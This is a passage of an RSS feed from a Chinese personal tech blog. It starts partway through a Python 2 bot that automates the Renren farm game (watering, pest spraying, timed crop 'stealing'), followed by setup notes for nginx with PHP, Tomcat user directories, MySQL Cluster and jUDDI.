&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.water(friend['userId'],i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;han=''<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['t']&gt;0 or land['g']&gt;0:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if self.autonorm:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while land['g']&gt;0: #杀小虫<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.spraying(friend['userId'],i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;land['g']-=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;norm=u'捉虫1'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if land['t'] &gt; 0:&nbsp; #杀大虫<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.spraying(friend['userId'],i)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;norm=u'杀虫1/%d' % land['t']<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;norm=''<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=u'\t%d\t%s\t%s\t%s\t%s\t%s' % (<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;i,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;s[0]['cName'],<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;stealed,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;weed,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;han,<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;norm)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print temp.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return ret.values()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;def delFriend(self,fid):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://icode.renren.com/getcode.do?t=delfriend_&amp;temp=%d' % int(time.time()*1000)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;open('test.bmp','w').write(self.req(url))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;verify=sys.stdin.readline()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;url='http://friend.renren.com/DelFriend.do'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;body={'co<wbr>de':verify[0:len(verify)-1],'id':fid}<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return json.read(self.req(url,body))<br>#在时间T自动去偷<br>def threadSteal(farm, T, fid, place):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(T-int(time.time())+2)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if fid==-1:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=farm.harvest(place)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;temp=farm.steal(fid,place)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if temp.has_key('harvest'):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'Thread 偷得 %d at %s:%d'.encode('utf-8') % (temp['harvest'],fid,place)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'Thread Failed %s at %s:%d'.encode('utf-8') % (temp,fid,place)<br><br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm = Farm()<br>#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.debug=True<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Login...'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;try:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'请输入校内网用户邮箱:'.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;email=sys.stdin.readline()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'请输入密码:'.encode('utf-8')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;password=sys.stdin.readline()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.login(email[0:len(email)-1],password[0:len(password)-1])<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else:#自动登录<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.login('校内网用户邮箱','密码')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;#&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.addFriends();<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;interval=20*60<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;while True:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print 'Auto run...'<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;farm.autorun(interval=interval) #自动运行<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;print u'%s等待下次运行:%d分钟后'.encode('utf-8') % (time.ctime(),interval/60)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;sys.stdout.flush()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;time.sleep(interval)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;except:<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;continue<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200972192750690/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu8.10安装nginx和php]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201061764117939/</link>
      <description>
<![CDATA[1. 安装软件 <br>sudo apt-get install nginx<br>sudo apt-get install lighttpd<br>sudo update-rc.d -f lighttpd remove<br><br>2. 配置nginx的php转发<br>sudo vi /usr/local/nginx/conf/nginx.conf，在location ~ \.php$附近加入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; location ~ \.php$ {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fastcgi_pass 127.0.0.1:9000;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fastcgi_index index.php;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fastcgi_param SCRIPT_FILENAME /var/www/$fastcgi_script_name;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; include fastcgi_params;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>#编写php测试文件: test.php<br>sudo cat&gt;&gt;/var/www/test.php&lt;&lt;EOF<br>&lt;?php<br>echo "Hello, Worlp";<br>?&gt;<br>EOF<br><br>3. 启动测试<br>sudo /usr/bin/spawn-fcgi -a 127.0.0.1 -p 9000 -C 5 -u www-data -g www-data -f /usr/bin/php-cgi<br>sudo /usr/local/nginx/sbin/nginx<br>curl http://localhost/test.php]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201061764117939/</guid>
    </item>
    <item>
      <title>
<![CDATA[Tomcat支持多用户]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008491270454/</link>
      <description>
<![CDATA[许多web服务器会自动将以"~"和用户名开始的URI映射到用户主目录下的某个目录（通常为public_html）。在Catalina中，通过使用特殊的Listener元素，可以完成上述功能<br>方法：修改&lt;tomcat&gt;/conf/server.xml,在&lt;Host&gt;节点之间增加<br>Unix下常用/etc/passwd文件记录用户信息，可以这样配置（未测试）<br>&lt;Listener className="org.apache.catalina.startup.UserConfig"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; directoryName="public_html"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userClass="org.apache.catalina.startup.PasswdUserDatabase"/&gt;<br>在Windows平台下，加入一下一段Listener配置（测试成功)。<br>&lt;Host ...&gt;<br>...<br>&lt;Listener className="org.apache.catalina.startup.UserConfig"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; directoryName="public_html"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; homeBase=<span style="color: rgb(255, 0, 0);">"E:\websites"</span><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userClass="org.apache.catalina.startup.HomesUserDatabase"/&gt;<br>&lt;/Host&gt;<br>文件目录结构 <br>E:.<br>└─websites<br>&nbsp;&nbsp;&nbsp; ├─hankjin<br>&nbsp;&nbsp;&nbsp; │&nbsp; └─public_html<br>&nbsp;&nbsp;&nbsp; │&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index.html<br>&nbsp;&nbsp;&nbsp; │<br>&nbsp;&nbsp;&nbsp; └─john<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; └─public_html<br>然后访问http://localhost:8080/~hankjin/index.html即可<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008491270454/</guid>
    </item>
    <item>
      <title>
<![CDATA[ubuntu8.10上启动mysql cluster]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720105217332949/</link>
      <description>
<![CDATA[环境两台Ubuntu8.10服务器，分别为：<br>mysql1: 192.201.0.61<br>mysql2: 192.201.0.62<br>其中mysql1作为管理节点+数据节点1+mysql节点1，mysql2作为数据节点1+mysql节点2<br>首先分别在各个节点上安装软件<br>sudo apt-get install mysql-server<br>然后配置管理节点mysql1<br>sudo vi /etc/mysql/ndb_mgmd.cnf<br>[NDBD DEFAULT]<br>NoOfReplicas=2 #这里有mysql1和mysql2两个数据节点<br>DataMemory=250M<br>IndexMemory=100M<br>[TCP DEFAULT]<br>portnumber=2202<br>#管理节点<br>[NDB_MGMD]<br>id=1<br>hostname=192.201.0.61<br>datadir=/home/hankjin/mysql-cluster<br>#数据节点1<br>[NDBD]<br>id=2<br>hostname=192.201.0.61<br>datadir=/home/hankjin/mysql/data<br>#数据节点2<br>[NDBD]<br>id=3<br>hostname=192.201.0.62<br>datadir=/home/hankjin/mysql/data<br>#mysql节点1<br>[MYSQLD]<br>hostname=192.201.0.61<br>#mysql节点2<br>[MYSQLD]<br>hostname=192.201.0.62<br>然后修改各个节点的配置文件<br>sudo vi /etc/mysql/my.cnf<br>找到[mysqld]，然后在这一行的下面添加两行<br>ndbcluster<br>ndb-connectstring=192.201.0.61 #管理节点<br>然后找到CLUSTER，并取消注释<br>[MYSQL_CLUSTER]<br>ndb-connectstring=192.201.0.61 #管理节点<br><br>然后开始启动CLUSTER，<br>首先启动管理节点<br>sudo /etc/init.d/mysql-ndb-mgm start<br>然后分别启动两个数据节点,第一次启动的时候用start-initial，以后就可以直接用start<br>sudo /etc/init.d/mysql-ndb start-initial<br>最后启动mysql节点<br>sudo /etc/init.d/mysql start<br><br>测试管理节点<br>ndb_mgm<br>&gt;&gt;show<br>测试cluster<br>在mysql1的mysql节点上<br>create database test;<br>use test;<br>create table t(name varchar(20)) engine=ndb;<br>insert into t values('hank');<br>然后在mysql2的mysql节点上<br>create database test;<br>use test;<br>show tables;<br>#可以直接看到t，但是数据库test必须手工创建<br>select * from t;<br>#在节点1上插入的数据在这里也可以看到，这里插入的数据在节点1上也可以看到。<br>insert into t values('hjz');<br>从管理节点关闭cluster<br>ndb_mgm<br>&gt;&gt;shutdown]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>DataBase</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720105217332949/</guid>
    </item>
    <item>
      <title>
<![CDATA[JUDDI安装于配置]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832111427127/</link>
      <description>
<![CDATA[<P>1。下载jUDDI-2.0r5.war，放入webapps/目录下</P>  <P>2。启动Tomcat，生成juddi目录，进入目录，查看juddi.properteis文件，里面用到了数据源</P>  <P>3。打开WEB-INF/lib目录下的juddi-xxx.jar文件，找到里面的mysql/creaetdatabases.sql和publishser.sql，在mysql中创建数据库juddi，用户名和密码都是juddi,然后修改执行这两个sql</P>  <P>4。配置数据源，在conf/context.xml的&lt;Context&gt;中间加上</P>  <P>&nbsp;&lt;Resource name="jdbc/juddiDB" auth="Container" type="javax.sql.DataSource"<BR>&nbsp;&nbsp;maxActive="100" maxIdle="30" maxWait="10000"<BR>&nbsp;&nbsp;username="juddi" password="juddi" <BR>&nbsp;&nbsp;driverClassName="com.mysql.jdbc.Driver"<BR>&nbsp;&nbsp;url="jdbc:mysql://127.0.0.1:3306/juddi"/&gt;<BR>在/WEB-INF/web.xml中加上（默认就有）</P>  <P>&lt;resource-ref&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;description&gt;DB Connection&lt;/description&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;res-ref-name&gt;jdbc/juddiDB&lt;/res-ref-name&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;res-type&gt;javax.sql.DataSource&lt;/res-type&gt;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;res-auth&gt;Container&lt;/res-auth&gt;<BR> &lt;/resource-ref&gt;</P>  <P>5。打开<A rel="nofollow" href="http://localhost:8080/juddi/"  >http://localhost:8080/juddi/</A>&nbsp;&nbsp; validate</P>  <P>6。测试</P>  <P>下载uddi4j.jar和soap.jar，配置props文件，运行</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832111427127/</guid>
    </item>
    <item>
      <title>
<![CDATA[网上匿名投票的矛与盾]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009103095317820/</link>
      <description>
